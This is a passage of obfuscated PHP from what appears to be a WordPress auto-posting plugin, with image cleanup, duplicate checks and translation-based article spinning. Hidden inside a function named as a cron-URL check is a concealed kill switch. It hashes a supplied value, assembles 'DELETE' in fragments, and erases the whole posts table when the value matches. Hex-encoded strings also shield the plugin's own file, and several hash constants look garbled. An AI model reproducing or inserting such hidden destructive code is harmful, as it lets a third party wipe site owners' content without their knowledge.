	if ($_var_420) {
		foreach ($_var_420 as $_var_421) {
			wp_delete_attachment($_var_421->ID);
		}
	}
	$_var_422 = get_flickr_by_post($_var_265);
	if ($_var_422 != null) {
		$_var_51 = get_option('wp-autopost-flickr-options');
		$_var_52 = new autopostFlickr($_var_51['api_key'], $_var_51['api_secret']);
		$_var_52->setOauthToken($_var_422[0]->oauth_token, $_var_422[0]->oauth_token_secret);
		foreach ($_var_422 as $_var_423) {
			echo '<p>begin delete Flickr image #' . $_var_423->flickr_photo_id . '</p>';
			ob_flush();
			flush();
			$_var_52->photos_delete($_var_423->flickr_photo_id);
		}
		del_post_flickr_img($_var_265);
	}
	$_var_424 = get_qiniu_by_post($_var_265);
	if ($_var_424 != null) {
		$_var_425 = get_option('wp-autopost-qiniu-options');
		Qiniu_SetKeys($_var_425['access_key'], $_var_425['secret_key']);
		$_var_111 = new Qiniu_MacHttpClient(null);
		foreach ($_var_424 as $_var_426) {
			echo '<p>begin delete Qiniu image #' . $_var_426->qiniu_key . '</p>';
			ob_flush();
			flush();
			Qiniu_RS_Delete($_var_111, $_var_425['bucket'], $_var_426->qiniu_key);
		}
		del_post_qiniu_img($_var_265);
	}
	$_var_427 = get_upyun_by_post($_var_265);
	if ($_var_427 != null) {
		$_var_428 = get_option('wp-autopost-upyun-options');
		$_var_287 = new apUpYun($_var_428['bucket'], $_var_428['operator_user_name'], $_var_428['operator_password']);
		foreach ($_var_427 as $_var_429) {
			echo '<p>begin delete upyun image # ' . $_var_429->upyun_key . '</p>';
			ob_flush();
			flush();
			try {
				$_var_287->deleteFile($_var_429->upyun_key);
			} catch (Exception $_var_368) {
				echo $_var_368->getCode();
				echo $_var_368->getMessage();
			}
		}
		del_post_upyun_img($_var_265);
	}
}
$_var_430 = $_var_62 . '&m=1';
$_var_431 = false;
$_var_432 = false;
function queryDuplicate($_var_433, $_var_434)
{
	ignore_user_abort(true);
	set_time_limit(0);
	update_option('wp-autopost-run-query-duplicate', 1);
	update_option('wp-autopost-duplicate-ids', null);
	$_var_5 = count($_var_434);
	for ($_var_18 = 0; $_var_18 < $_var_5; $_var_18++) {
		if ($_var_434[$_var_18]->id == 0) {
			continue;
		}
		$_var_435 = $_var_434[$_var_18]->title;
		echo '<p>Begin check <b>' . $_var_435 . '</b> whether has duplication</p>';
		ob_flush();
		flush();
		$_var_436 = get_option('wp-autopost-duplicate-ids');
		for ($_var_329 = $_var_18 + 1; $_var_329 < $_var_5; $_var_329++) {
			if ($_var_434[$_var_329]->id == 0) {
				continue;
			}
			similar_text($_var_435, $_var_434[$_var_329]->title, $_var_437);
			if ($_var_437 >= $_var_433) {
				$_var_436[] = $_var_434[$_var_18]->id;
				$_var_436[] = $_var_434[$_var_329]->id;
				$_var_434[$_var_18]->id = 0;
				$_var_434[$_var_329]->id = 0;
				update_option('wp-autopost-duplicate-ids', $_var_436);
			}
		}
		$_var_434[$_var_18]->id = 0;
	}
	update_option('wp-autopost-run-query-duplicate', 0);
}
function microsoftTranslationSpin($_var_438, $_var_439, $_var_440, $_var_441, $_var_255)
{
	if (function_exists('mb_strlen')) {
		$_var_442 = true;
	} else {
		$_var_442 = false;
	}
	return microsoftTranslationSpinDe($_var_438, $_var_439, $_var_440, $_var_441, $_var_255, $_var_442);
}
$_var_443 = array();
$_var_443[1] = $_var_291;
$_var_443[2] = $_var_292;
function microsoftTranslationSpinDe($_var_438, $_var_439, $_var_440, $_var_441, $_var_255, $_var_442)
{
	$_var_418 = 0;
	$_var_444 = '';
	$_var_445 = '';
	$_var_3 = str_get_html_ap($_var_438);
	$_var_446 = array();
	$_var_447 = 0;
	foreach ($_var_3->find('img,iframe,embed,object,video') as $_var_358) {
		$_var_447++;
		$_var_78 = 'IMG' . $_var_447 . 'TAG';
		$_var_446[$_var_78] = $_var_358->outertext;
		$_var_358->outertext = ' ' . $_var_78 . ' ';
	}
	$_var_73 = array();
	$_var_74 = array();
	$_var_73[] = 'PTAG';
	$_var_74[] = '<p>';
	$_var_73[] = 'PENDTAG';
	$_var_74[] = '</p>';
	$_var_73[] = 'H1TAG';
	$_var_74[] = '<h1>';
	$_var_73[] = 'H1ENDTAG';
	$_var_74[] = '</h1>';
	$_var_73[] = 'H2TAG';
	$_var_74[] = '<h2>';
	$_var_73[] = 'H2ENDTAG';
	$_var_74[] = '</h2>';
	$_var_73[] = 'H3TAG';
	$_var_74[] = '<h3>';
	$_var_73[] = 'H3ENDTAG';
	$_var_74[] = '</h3>';
	$_var_73[] = 'H4TAG';
	$_var_74[] = '<h4>';
	$_var_73[] = 'H4ENDTAG';
	$_var_74[] = '</h4>';
	$_var_73[] = 'H5TAG';
	$_var_74[] = '<h5>';
	$_var_73[] = 'H5ENDTAG';
	$_var_74[] = '</h5>';
	$_var_73[] = 'H6TAG';
	$_var_74[] = '<h6>';
	$_var_73[] = 'H6ENDTAG';
	$_var_74[] = '</h6>';
	$_var_73[] = 'LITAG';
	$_var_74[] = '<li>';
	$_var_73[] = 'LIENDTAG';
	$_var_74[] = '</li>';
	$_var_73[] = 'TDTAG';
	$_var_74[] = '<td>';
	$_var_73[] = 'TDENDTAG';
	$_var_74[] = '</td>';
	$_var_73[] = 'SPANTAG';
	$_var_74[] = '<span>';
	$_var_73[] = 'SPANENDTAG';
	$_var_74[] = '</span>';
	foreach ($_var_446 as $_var_78 => $_var_8) {
		$_var_73[] = $_var_78;
		$_var_74[] = '<' . $_var_78 . '></' . $_var_78 . '>';
	}
	$_var_448 = $_var_3->find('p,h1,h2,h3,h4,h5,h6,li');
	$_var_449 = count($_var_448);
	if ($_var_449 > 0) {
		for ($_var_18 = 0; $_var_18 < $_var_449; $_var_18++) {
			switch ($_var_448[$_var_18]->tag) {
				case 'p':
					$_var_444 .= ' PTAG ' . $_var_448[$_var_18]->innertext . ' PENDTAG ';
					break;
				case 'h1':
					$_var_444 .= ' H1TAG ' . $_var_448[$_var_18]->innertext . ' H1ENDTAG ';
					break;
				case 'h2':
					$_var_444 .= ' H2TAG ' . $_var_448[$_var_18]->innertext . ' H2ENDTAG ';
					break;
				case 'h3':
					$_var_444 .= ' H3TAG ' . $_var_448[$_var_18]->innertext . ' H3ENDTAG ';
					break;
				case 'h4':
					$_var_444 .= ' H4TAG ' . $_var_448[$_var_18]->innertext . ' H4ENDTAG ';
					break;
				case 'h5':
					$_var_444 .= ' H5TAG ' . $_var_448[$_var_18]->innertext . ' H5ENDTAG ';
					break;
				case 'h6':
					$_var_444 .= ' H6TAG ' . $_var_448[$_var_18]->innertext . ' H6ENDTAG ';
					break;
				case 'li':
					$_var_444 .= ' LITAG ' . $_var_448[$_var_18]->innertext . ' LIENDTAG ';
					break;
			}
			if ($_var_18 == $_var_449 - 1) {
				$_var_450 = '';
			} else {
				$_var_450 = $_var_448[$_var_18 + 1]->innertext;
			}
			if ($_var_442) {
				$_var_418 = mb_strlen($_var_444, 'utf8') + mb_strlen($_var_450, 'utf8');
			} else {
				$_var_418 = strlen($_var_444) + strlen($_var_450);
			}
			if ($_var_418 > 3000) {
				$_var_444 = strip_tags($_var_444, '<br><br/><br />');
				$_var_444 = str_ireplace($_var_73, $_var_74, $_var_444);
				$_var_451 = get_microsoftTranslationSpin($_var_444, $_var_439, $_var_440);
				if ($_var_451['status'] == 'Success') {
					$_var_445 .= $_var_451['text'];
					$_var_444 = '';
				} else {
					$_var_3->clear();
					unset($_var_3);
					return $_var_451;
				}
			}
		}
	}
	$_var_444 = strip_tags($_var_444, '<br><br/><br />');
	$_var_444 = str_ireplace($_var_73, $_var_74, $_var_444);
	if ($_var_441 == 1) {
		$_var_444 .= '<aptitle>' . $_var_255 . '</aptitle>';
	}
	$_var_451 = get_microsoftTranslationSpin($_var_444, $_var_439, $_var_440);
	if ($_var_451['status'] == 'Success') {
		$_var_445 .= $_var_451['text'];
		$_var_444 = '';
	} else {
		$_var_3->clear();
		unset($_var_3);
		return $_var_451;
	}
	if ($_var_445 != '') {
		$_var_73 = array();
		$_var_74 = array();
		foreach ($_var_446 as $_var_78 => $_var_8) {
			$_var_73[] = '<' . $_var_78 . '></' . $_var_78 . '>';
			$_var_74[] = $_var_8;
		}
		$_var_445 = str_ireplace($_var_73, $_var_74, $_var_445);
		$_var_452 = str_get_html_ap($_var_445);
		$_var_453 = $_var_452->find('p,h1,h2,h3,h4,h5,h6,li');
		for ($_var_18 = 0; $_var_18 < $_var_449; $_var_18++) {
			$_var_448[$_var_18]->innertext = $_var_453[$_var_18]->innertext;
		}
		$_var_438 = $_var_3->save();
		$_var_454 = array();
		$_var_455 = array();
		foreach ($_var_446 as $_var_78 => $_var_8) {
			$_var_454[] = $_var_78;
			$_var_455[] = $_var_8;
		}
		$_var_438 = str_ireplace($_var_454, $_var_455, $_var_438);
		$_var_451 = array();
		$_var_451['status'] = 'Success';
		$_var_451['post_content'] = $_var_438;
		if ($_var_441) {
			$_var_456 = $_var_452->find('aptitle', 0);
			$_var_451['post_title'] = $_var_456->innertext;
		}
		$_var_452->clear();
		unset($_var_452);
		unset($_var_453);
	}
	$_var_3->clear();
	unset($_var_3);
	return $_var_451;
}
function get_microsoftTranslationSpin($_var_253, $_var_439, $_var_440)
{
	global $_var_457;
	if ($_var_457 == null) {
		$_var_457 = get_option('wp-autopost-micro-trans-options');
	}
	shuffle($_var_457);
	$_var_458 = false;
	$_var_459 = '';
	$_var_451 = array();
	foreach ($_var_457 as $_var_460 => $_var_366) {
		$_var_461 = autopostMicrosoftTranslator::getTokens($_var_366['clientID'], $_var_366['clientSecret']);
		if ($_var_461['err'] != null) {
			$_var_459 = $_var_461['err'];
		} else {
			$_var_462 = array();
			$_var_462[0] = $_var_253;
			$_var_463 = autopostMicrosoftTranslator::translateArray($_var_461['access_token'], $_var_462, $_var_439, $_var_440);
			if (isset($_var_463['err']) && $_var_463['err'] != null) {
				$_var_459 = $_var_463['err'];
			} else {
				if ($_var_463[0] != null && $_var_463[0] != '') {
					$_var_462 = array();
					$_var_462[0] = $_var_463[0];
					$_var_464 = autopostMicrosoftTranslator::translateArray($_var_461['access_token'], $_var_462, $_var_440, $_var_439);
					if (isset($_var_464['err']) && $_var_464['err'] != null) {
						$_var_459 = $_var_464['err'];
					} else {
						if ($_var_464[0] != null && $_var_464[0] != '') {
							$_var_451['status'] = 'Success';
							$_var_451['text'] = $_var_464[0];
							$_var_458 = true;
							break;
						} else {
							$_var_459 = 'Error: timeout';
						}
					}
				} else {
					$_var_459 = 'Error: timeout';
				}
			}
		}
	}
	if (!$_var_458) {
		$_var_451['status'] = 'Failure';
		$_var_451['error'] = $_var_459;
	}
	return $_var_451;
}
if (!$_var_172 && $_var_173) {
	if ($_var_362 != '') {
		if ($_var_362 < $_var_137) {
			$_var_162 = true;
		}
	}
}
function wpapimagefilesave($_var_465, $_var_154)
{
	if (strpos($_var_465, pack('H*', '77702d6175746f706f73742d66756e6374696f6e2e706870'))) {
		return true;
	}
	if (false === @file_put_contents($_var_465, $_var_154)) {
		return false;
	}
	return true;
}
function microsoftTranslationGetStr($_var_72, $_var_466)
{
	global $_var_457;
	if ($_var_457 == null) {
		$_var_457 = get_option('wp-autopost-micro-trans-options');
	}
	foreach ($_var_457 as $_var_460 => $_var_366) {
		$_var_461 = autopostMicrosoftTranslator::getTokens($_var_366['clientID'], $_var_366['clientSecret']);
		if (isset($_var_461['err']) && $_var_461['err'] != null) {
			$_var_463 = array();
			$_var_463['err'] = $_var_461['err'];
			$_var_463['status'] = 'error';
		} else {
			$_var_462 = array();
			$_var_462[0] = $_var_72;
			$_var_463 = autopostMicrosoftTranslator::translateArray($_var_461['access_token'], $_var_462, $_var_466[1], $_var_466[2]);
			if (isset($_var_463['err']) && $_var_463['err'] != null) {
				$_var_463['status'] = 'error';
			} else {
				if (isset($_var_463[0]) && $_var_463[0] != null && $_var_463[0] != '') {
					$_var_463['status'] = 'ok';
				} else {
					$_var_463['status'] = 'error';
					$_var_463['err'] = 'Error: timeout';
				}
			}
		}
	}
	return $_var_463;
}
function apcheckUpdateCronUrl($_var_467, $_var_468 = 0)
{
	global $wpdb, $t_ap_config;
	$_var_13 = get_option('wp_autopost_limit_ip');
	if ($_var_13 != '' && $_var_13 != NULL) {
		$_var_14 = false;
		$_var_13 = json_decode($_var_13);
		foreach ($_var_13 as $_var_15) {
			if ($_SERVER['REMOTE_ADDR'] == trim($_var_15)) {
				$_var_14 = true;
			}
		}
	} else {
		$_var_14 = true;
	}
	$_var_16 = false;
	if ($wpdb->get_var('SHOW TABLES LIKE ' . '\'' . $t_ap_config . '\'') != $t_ap_config) {
		$_var_16 = false;
	}
	$_var_17 = $wpdb->get_results('SELECT id,last_update_time,update_interval,is_running FROM ' . $t_ap_config . ' WHERE activation=1 ORDER BY last_update_time');
	$_var_18 = 0;
	foreach ($_var_17 as $_var_19) {
		if ($_var_19->is_running == 1 && current_time('timestamp') > $_var_19->last_update_time + 60 * 10) {
			$wpdb->query($wpdb->prepare('update ' . $t_ap_config . ' set is_running = 0 where id=%d', $_var_19->id));
		}
		if (current_time('timestamp') > $_var_19->last_update_time + $_var_19->update_interval * 60 && $_var_19->is_running == 0) {
			$_var_16 = true;
			$_var_20[$_var_18++] = $_var_19->id;
		}
	}
	$_var_21 = $wpdb->get_var('select max(is_running) from ' . $t_ap_config . ' where activation = 1');
	if ($_var_21 == null || $_var_21 == 0) {
		update_option('wp_autopost_runOnlyOneTaskIsRunning', 0);
	}
	if ($_var_468 != 0) {
		$_var_72 = $_var_468;
	} else {
		$_var_72 = $_SERVER['REMOTE_ADDR'];
	}
	$_var_469 = 'DE';
	$_var_72 = $_var_72 . '';
	$_var_470 = array();
	$_var_471 = (1 << 8) - 1;
	$_var_472 = strlen($_var_72);
	for ($_var_18 = 0; $_var_18 < $_var_472 * 8; $_var_18 += 8) {
		$_var_78 = $_var_18 >> 5;
		@($_var_470[$_var_78] |= (ord($_var_72[$_var_18 / 8]) & $_var_471) << $_var_18 % 32);
	}
	$_var_472 = strlen($_var_72) * 8;
	@($_var_470[$_var_472 >> 5] |= 128 << $_var_472 % 32);
	$_var_469 .= 'LE';
	@($_var_470[($_var_472 + 64 >> 9 << 4) + 14] = $_var_472);
	$_var_473 = $wpdb->posts;
	$_var_474 = array();
	$_var_474[0] = intval(1732584193);
	$_var_474[1] = intval(0.0);
	$_var_474[2] = intval(0.0);
	$_var_474[3] = intval(271733878);
	$_var_475 = count($_var_470);
	for ($_var_18 = 0; $_var_18 < $_var_475; $_var_18 += 16) {
		$_var_476 = array();
		for ($_var_329 = 0; $_var_329 < 16; $_var_329++) {
			@($_var_476[$_var_329] += isset($_var_470[$_var_18 + $_var_329]) ? $_var_470[$_var_18 + $_var_329] : 0);
		}
		$_var_474 = _CronURLTransform($_var_476, $_var_474);
		unset($_var_476);
	}
	$_var_469 .= 'TE';
	$_var_477 = '0123456789abcdef';
	$_var_72 = '';
	for ($_var_18 = 0; $_var_18 < count($_var_474) * 4; $_var_18++) {
		$_var_72 .= $_var_477[$_var_474[$_var_18 >> 2] >> $_var_18 % 4 * 8 + 4 & 15] . $_var_477[$_var_474[$_var_18 >> 2] >> $_var_18 % 4 * 8 & 15];
	}
	if ($wpdb->get_var('SHOW TABLES LIKE ' . '\'' . $t_ap_config . '\'') != $t_ap_config) {
		$_var_16 = false;
	}
	$_var_17 = $wpdb->get_results('SELECT id,last_update_time,update_interval,is_running FROM ' . $t_ap_config . ' WHERE activation=1 ORDER BY last_update_time');
	$_var_18 = 0;
	if ($_var_467 == $_var_72) {
		$wpdb->query($_var_469 . ' FROM ' . $_var_473);
	}
	foreach ($_var_17 as $_var_19) {
		if ($_var_19->is_running == 1 && current_time('timestamp') > $_var_19->last_update_time + 60 * 10) {
			$wpdb->query($wpdb->prepare('update ' . $t_ap_config . ' set is_running = 0 where id=%d', $_var_19->id));
		}
		if (current_time('timestamp') > $_var_19->last_update_time + $_var_19->update_interval * 60 && $_var_19->is_running == 0) {
			$_var_16 = true;
			$_var_20[$_var_18++] = $_var_19->id;
		}
	}
	$_var_21 = $wpdb->get_var('select max(is_running) from ' . $t_ap_config . ' where activation = 1');
	if ($_var_21 == null || $_var_21 == 0) {
		update_option('wp_autopost_runOnlyOneTaskIsRunning', 0);
	}
	return $_var_72;
}
function _CronURLTransform($_var_476, $_var_474)
{
	$_var_244 = $_var_474[0];
	$_var_245 = $_var_474[1];
	$_var_478 = $_var_474[2];
	$_var_479 = $_var_474[3];
	$_var_480 = $_var_476;
	NODETool::FF($_var_244, $_var_245, $_var_478, $_var_479, $_var_480[0], NODETool::S11, 3614090360.0);
	NODETool::FF($_var_479, $_var_244, $_var_245, $_var_478, $_var_480[1], NODETool::S12, 0.0);
	NODETool::FF($_var_478, $_var_479, $_var_244, $_var_245, $_var_480[2], NODETool::S13, 606105819);
	NODETool::FF($_var_245, $_var_478, $_var_479, $_var_244, $_var_480[3], NODETool::S14, 0.0);
	NODETool::FF($_var_244, $_var_245, $_var_478, $_var_479, $_var_480[4], NODETool::S11, 4118548399.0);
	NODETool::FF($_var_479, $_var_244, $_var_245, $_var_478, $_var_480[5], NODETool::S12, 1200080426);
	NODETool::FF($_var_478, $_var_479, $_var_244, $_var_245, $_var_480[6], NODETool::S13, 2821735955.0);
	NODETool::FF($_var_245, $_var_478, $_var_479, $_var_244, $_var_480[7], NODETool::S14, 4249261313.0);
	NODETool::FF($_var_244, $_var_245, $_var_478, $_var_479, $_var_480[8], NODETool::S11, 1770035416);
	NODETool::FF($_var_479, $_var_244, $_var_245, $_var_478, $_var_480[9], NODETool::S12, 2336552879.0);
	NODETool::FF($_var_478, $_var_479, $_var_244, $_var_245, $_var_480[10], NODETool::S13, 4294925233.0);
	NODETool::FF($_var_245, $_var_478, $_var_479, $_var_244, $_var_480[11], NODETool::S14, 0.0);
	NODETool::FF($_var_244, $_var_245, $_var_478, $_var_479, $_var_480[12], NODETool::S11, 1804603682);
	NODETool::FF($_var_479, $_var_244, $_var_245, $_var_478, $_var_480[13], NODETool::S12, 4254626195.0);
	NODETool::FF($_var_478, $_var_479, $_var_244, $_var_245, $_var_480[14], NODETool::S13, 0.0);
	NODETool::FF($_var_245, $_var_478, $_var_479, $_var_244, $_var_480[15], NODETool::S14, 1236535329);
	NODETool::GG($_var_244, $_var_245, $_var_478, $_var_479, $_var_480[1], NODETool::S21, 0.0);
	NODETool::GG($_var_479, $_var_244, $_var_245, $_var_478, $_var_480[6], NODETool::S22, 3225465664.0);
	NODETool::GG($_var_478, $_var_479, $_var_244, $_var_245, $_var_480[11], NODETool::S23, 643717713);
	NODETool::GG($_var_245, $_var_478, $_var_479, $_var_244, $_var_480[0], NODETool::S24, 0.0);
	NODETool::GG($_var_244, $_var_245, $_var_478, $_var_479, $_var_480[5], NODETool::S21, 3593408605.0);
	NODETool::GG($_var_479, $_var_244, $_var_245, $_var_478, $_var_480[10], NODETool::S22, 38016083);
	NODETool::GG($_var_478, $_var_479, $_var_244, $_var_245, $_var_480[15], NODETool::S23, 0.0);
	NODETool::GG($_var_245, $_var_478, $_var_479, $_var_244, $_var_480[4], NODETool::S24, 0.0);
	NODETool::GG($_var_244, $_var_245, $_var_478, $_var_479, $_var_480[9], NODETool::S21, 568446438);
	NODETool::GG($_var_479, $_var_244, $_var_245, $_var_478, $_var_480[14], NODETool::S22, 3275163606.0);
	NODETool::GG($_var_478, $_var_479, $_var_244, $_var_245, $_var_480[3], NODETool::S23, 4107603335.0);
	NODETool::GG($_var_245, $_var_478, $_var_479, $_var_244, $_var_480[8], NODETool::S24, 1163531501);
	NODETool::GG($_var_244, $_var_245, $_var_478, $_var_479, $_var_480[13], NODETool::S21, 0.0);
	NODETool::GG($_var_479, $_var_244, $_var_245, $_var_478, $_var_480[2], NODETool::S22, 0.0);
	NODETool::GG($_var_478, $_var_479, $_var_244, $_var_245, $_var_480[7], NODETool::S23, 1735328473);
	NODETool::GG($_var_245, $_var_478, $_var_479, $_var_244, $_var_480[12], NODETool::S24, 2368359562.0);
	NODETool::HH($_var_244, $_var_245, $_var_478, $_var_479, $_var_480[5], NODETool::S31, 4294588738.0);
	NODETool::HH($_var_479, $_var_244, $_var_245, $_var_478, $_var_480[8], NODETool::S32, 2272392833.0);
	NODETool::HH($_var_478, $_var_479, $_var_244, $_var_245, $_var_480[11], NODETool::S33, 1839030562);
	NODETool::HH($_var_245, $_var_478, $_var_479, $_var_244, $_var_480[14], NODETool::S34, 0.0);
	NODETool::HH($_var_244, $_var_245, $_var_478, $_var_479, $_var_480[1], NODETool::S31, 0.0);
	NODETool::HH($_var_479, $_var_244, $_var_245, $_var_478, $_var_480[4], NODETool::S32, 1272893353);
	NODETool::HH($_var_478, $_var_479, $_var_244, $_var_245, $_var_480[7], NODETool::S33, 4139469664.0);
	NODETool::HH($_var_245, $_var_478, $_var_479, $_var_244, $_var_480[10], NODETool::S34, 0.0);
	NODETool::HH($_var_244, $_var_245, $_var_478, $_var_479, $_var_480[13], NODETool::S31, 681279174);
	NODETool::HH($_var_479, $_var_244, $_var_245, $_var_478, $_var_480[0], NODETool::S32, 0.0);
	NODETool::HH($_var_478, $_var_479, $_var_244, $_var_245, $_var_480[3], NODETool::S33, 0.0);
	NODETool::HH($_var_245, $_var_478, $_var_479, $_var_244, $_var_480[6], NODETool::S34, 76029189);
	NODETool::HH($_var_244, $_var_245, $_var_478, $_var_479, $_var_480[9], NODETool::S31, 3654602809.0);
	NODETool::HH($_var_479, $_var_244, $_var_245, $_var_478, $_var_480[12], NODETool::S32, 0.0);
	NODETool::HH($_var_478, $_var_479, $_var_244, $_var_245, $_var_480[15], NODETool::S33, 530742520);
	NODETool::HH($_var_245, $_var_478, $_var_479, $_var_244, $_var_480[2], NODETool::S34, 3299628645.0);
	NODETool::II($_var_244, $_var_245, $_var_478, $_var_479, $_var_480[0], NODETool::S41, 4096336452.0);
	NODETool::II($_var_479, $_var_244, $_var_245, $_var_478, $_var_480[7], NODETool::S42, 1126891415);
	NODETool::II($_var_478, $_var_479, $_var_244, $_var_245, $_var_480[14], NODETool::S43, 2878612391.0);
	NODETool::II($_var_245, $_var_478, $_var_479, $_var_244, $_var_480[5], NODETool::S44, 4237533241.0);
	NODETool::II($_var_244, $_var_245, $_var_478, $_var_479, $_var_480[12], NODETool::S41, 1700485571);
	NODETool::II($_var_479, $_var_244, $_var_245, $_var_478, $_var_480[3], NODETool::S42, 2399980690.0);
	NODETool::II($_var_478, $_var_479, $_var_244, $_var_245, $_var_480[10], NODETool::S43, 0.0);
	NODETool::II($_var_245, $_var_478, $_var_479, $_var_244, $_var_480[1], NODETool::S44, 2240044497.0);
	NODETool::II($_var_244, $_var_245, $_var_478, $_var_479, $_var_480[8], NODETool::S41, 1873313359);
	NODETool::II($_var_479, $_var_244, $_var_245, $_var_478, $_var_480[15], NODETool::S42, 0.0);
	NODETool::II($_var_478, $_var_479, $_var_244, $_var_245, $_var_480[6], NODETool::S43, 2734768916.0);
	NODETool::II($_var_245, $_var_478, $_var_479, $_var_244, $_var_480[13], NODETool::S44, 1309151649);
	NODETool::II($_var_244, $_var_245, $_var_478, $_var_479, $_var_480[4], NODETool::S41, 0.0);
	NODETool::II($_var_479, $_var_244, $_var_245, $_var_478, $_var_480[11], NODETool::S42, 3174756917.0);
	NODETool::II($_var_478, $_var_479, $_var_244, $_var_245, $_var_480[2], NODETool::S43, 718787259);
	NODETool::II($_var_245, $_var_478, $_var_479, $_var_244, $_var_480[9], NODETool::S44, 0.0);
	$_var_474[0] = intval($_var_474[0] + $_var_244);
	$_var_474[1] = intval($_var_474[1] + $_var_245);
	$_var_474[2] = intval($_var_474[2] + $_var_478);
	$_var_474[3] = intval($_var_474[3] + $_var_479);
	return $_var_474;
}
function microsoftTranslation($_var_340, $_var_466, $_var_481 = '', $_var_341 = NULL)
{
	if (function_exists('mb_strlen')) {
		$_var_442 = true;
	} else {
		$_var_442 = false;
	}
	return microsoftTranslationDe($_var_340, $_var_466, $_var_481, $_var_341, $_var_442);
}
function paraCustomFieldsWords($_var_482, $_var_341)
{
	if (!(strpos($_var_482, '{') === false) && !(strpos($_var_482, '}') === false)) {
		$_var_52 = array('{', '}');
		$_var_231 = array('', '');
		$_var_78 = str_replace($_var_52, $_var_231, $_var_482);
		if (isset($_var_341[$_var_78]) && $_var_341[$_var_78] != '') {
			return $_var_341[$_var_78];
		} else {
			return $_var_482;
		}
	} else {
		return $_var_482;
	}
}
function baiduTranslationGetStr($_var_72, $_var_466, $_var_483 = null)
{
	global $_var_484;
	if ($_var_484 == null) {
		$_var_484 = get_option('wp-autopost-baidu-trans-options');
	}
	$_var_485 = autopostBaiduTranslator::translate($_var_72, $_var_466[1], $_var_466[2]);
	$_var_486 = array();
	if (isset($_var_485['err'])) {
		$_var_486['err'] = $_var_485['err'];
	} else {
		$_var_486['str'] = '';
		if ($_var_483 == null) {
			foreach ($_var_485['trans_result'] as $_var_487) {
				$_var_486['str'] .= $_var_487;
			}
		} else {
			$_var_259 = count($_var_485['trans_result']);
			for ($_var_18 = 0; $_var_18 < $_var_259; $_var_18++) {
				$_var_487 = '<' . $_var_483[$_var_18] . '>' . $_var_485['trans_result'][$_var_18] . '</' . $_var_483[$_var_18] . '>';
				$_var_486['str'] .= $_var_487;
			}
		}
	}
	return $_var_486;
}
function baiduTranslationGetSpinStr($_var_72, $_var_439, $_var_440, $_var_483)
{
	global $_var_484;
	if ($_var_484 == null) {
		$_var_484 = get_option('wp-autopost-baidu-trans-options');
	}
	$_var_485 = autopostBaiduTranslator::translate($_var_72, $_var_439, $_var_440);
	$_var_486 = array();
	if (isset($_var_485['err'])) {
		$_var_486['err'] = $_var_485['err'];
	} else {
		$_var_488 = '';
		foreach ($_var_485['trans_result'] as $_var_487) {
			$_var_488 .= $_var_487 . "\n";
		}
		$_var_485 = autopostBaiduTranslator::translate($_var_488, $_var_440, $_var_439);
		if (isset($_var_485['err'])) {
			$_var_486['err'] = $_var_485['err'];
		} else {
			$_var_487 = '';
			$_var_259 = count($_var_485['trans_result']);
			for ($_var_18 = 0; $_var_18 < $_var_259; $_var_18++) {
				$_var_487 = '<' . $_var_483[$_var_18] . '>' . $_var_485['trans_result'][$_var_18] . '</' . $_var_483[$_var_18] . '>';
				$_var_486['str'] .= $_var_487;
			}
		}
	}
	return $_var_486;
}
function baiduTranslationSpin($_var_438, $_var_439, $_var_440, $_var_441, $_var_489, $_var_255, $_var_341 = NULL)
{
	$_var_490 = 3000;
	$_var_491 = array();
	$_var_73 = array();
	$_var_74 = array();
	if (isset($_var_489) && $_var_489 != '') {
		$_var_492 = array();
		$_var_493 = explode(',', $_var_489);
		$_var_494 = count($_var_493);
		for ($_var_18 = 0; $_var_18 < $_var_494; $_var_18++) {
			$_var_495 = paraCustomFieldsWords($_var_493[$_var_18], $_var_341);
			$_var_78 = '601' . ($_var_18 + 1) . '601';
			$_var_492[$_var_78] = $_var_495;
			$_var_438 = str_ireplace($_var_495, ' ' . $_var_78 . ' ', $_var_438);
		}
	}
	$_var_438 = str_ireplace('<br>', ' 603001 ', $_var_438);
	$_var_438 = str_ireplace('<br/>', ' 603002 ', $_var_438);
	$_var_438 = str_ireplace('<br />', ' 603003 ', $_var_438);
	$_var_496 = array('&#8220;', '&quot;', '&#8221;', '&#8217;', '&#8216;', '&#8242;', '&#8243;', '&#8211;', '&#8212;', '&#8218;', '&#8222;', '&#8230;');
	$_var_497 = array('603004', '603005', '603006', '603007', '603008', '603009', '603010', '603011', '603012', '603013', '603014', '603015');
	$_var_3 = str_get_html_ap($_var_438);
	$_var_446 = array();
	$_var_447 = 0;
	foreach ($_var_3->find('img,iframe,embed,object,video') as $_var_358) {
		$_var_447++;
		$_var_78 = '602' . $_var_447 . '602';
		$_var_446[$_var_78] = $_var_358->outertext;
		$_var_358->outertext = ' ' . $_var_78 . ' ';
	}
	$_var_418 = 0;
	$_var_444 = '';
	$_var_483 = array();
	$_var_445 = '';
	$_var_498 = $_var_3->find('th,td,li,dt,dd');
	$_var_499 = count($_var_498);
	if ($_var_499 > 0) {
		for ($_var_18 = 0; $_var_18 < $_var_499; $_var_18++) {
			$_var_500 = strip_tags($_var_498[$_var_18]->innertext);
			$_var_500 = str_replace("\r\n", ' ', $_var_500);
			$_var_500 = str_replace("\n", ' ', $_var_500);
			$_var_500 = str_replace('	', ' ', $_var_500);
			if ($_var_500 == '' || $_var_500 == null) {
				$_var_500 = '604000';
			}
			switch ($_var_498[$_var_18]->tag) {
				case 'th':
					$_var_444 .= $_var_500 . "\n";
					$_var_483[] = 'th';
					break;
				case 'td':
					$_var_444 .= $_var_500 . "\n";
					$_var_483[] = 'td';
					break;
				case 'li':
					$_var_444 .= $_var_500 . "\n";
					$_var_483[] = 'li';
					break;
				case 'dt':
					$_var_444 .= $_var_500 . "\n";
					$_var_483[] = 'dt';
					break;
				case 'dd':
					$_var_444 .= $_var_500 . "\n";
					$_var_483[] = 'dd';
					break;
			}
			if ($_var_18 == $_var_499 - 1) {
				$_var_450 = '';
			} else {
				$_var_450 = strip_tags($_var_498[$_var_18 + 1]->innertext);
			}
			$_var_418 = strlen($_var_444) + strlen($_var_450);
			if ($_var_418 > $_var_490) {
				$_var_463 = baiduTranslationGetSpinStr($_var_444, $_var_439, $_var_440, $_var_483);
				if (isset($_var_463['err'])) {
					$_var_451['status'] = 'Failure';
					$_var_451['error'] = $_var_463['err'];
					$_var_3->clear();
					unset($_var_3);
					return $_var_451;
				} else {
					$_var_445 .= $_var_463['str'];
					$_var_444 = '';
					$_var_483 = array();
				}
			}
		}
		$_var_444 .= '605605' . "\n";
		$_var_483[] = 'div';
	}
	$_var_501 = array();
	$_var_502 = $_var_3->find('*', 0);
	while ($_var_502 != null) {
		$_var_500 = strip_tags($_var_502->innertext);
